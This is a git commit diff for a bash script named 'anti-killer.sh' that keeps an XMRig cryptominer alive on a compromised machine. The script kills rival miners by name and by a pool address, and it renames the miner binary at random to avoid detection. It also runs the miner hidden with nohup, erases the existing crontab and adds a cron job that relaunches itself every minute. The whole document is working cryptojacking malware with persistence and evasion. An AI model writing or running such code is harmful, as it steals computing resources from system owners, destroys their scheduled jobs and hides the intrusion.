420c9f232948d5c1e86cee599ae6c02584127eaa
gorguzaaaaz <sigmaboy182009@gmail.com>
2025-03-07 16:17:47 +0530

    Update anti-killer.sh

--- anti-killer.sh
+++ anti-killer.sh
@@ -1,20 +1,30 @@
 #!/bin/bash
+my_miner="kasm"
+
 while true; do
-    if pgrep -f "xmrig.*config.json" > /dev/null; then
-        echo "My Miner Running 🔥"
-    else
-        randname=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 10 | head -n 1)
-        mv /tmp/xmrig/xmrig-6.22.2/xmrig /tmp/xmrig/xmrig-6.22.2/$randname
-        chmod +x /tmp/xmrig/xmrig-6.22.2/$randname
-        nohup /tmp/xmrig/xmrig-6.22.2/$randname > /dev/null 2>&1 &
-    fi
-    
-    # KILL Other Miners (Not Your Own)
-    ps aux | grep -v "xmrig.*config.json" | grep -E "minerd|crypto|nicehash|nanopool|supportxmr|moneroocean|75.119.158.0:3333" | awk '{print $2}' | xargs kill -9 2>/dev/null
+    pkill -f minerd
+    pkill -f crypto
+    pkill -f nicehash
+    pkill -f nanopool
+    pkill -f supportxmr
+    pkill -f moneroocean
+    pkill -f 75.119.158.0:3333
+    pkill -f "xmrig.*config.json"
+
+    for pid in $(pgrep -f xmrig); do
+        pname=$(ps -p $pid -o args=)
+        if [[ "$pname" != *"$my_miner"* ]]; then
+            kill -9 $pid
+        fi
+    done
+
+    randname=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 10 | head -n 1)
+    mv /tmp/xmrig/xmrig-6.22.2/xmrig /tmp/xmrig/xmrig-6.22.2/$randname
+    chmod +x /tmp/xmrig/xmrig-6.22.2/$randname
+    nohup /tmp/xmrig/xmrig-6.22.2/$randname > /dev/null 2>&1 &
 
     crontab -r
     echo "* * * * * nohup bash /tmp/anti-killer.sh > /dev/null 2>&1 &" | crontab -
 
     sleep 0.1
 done
-
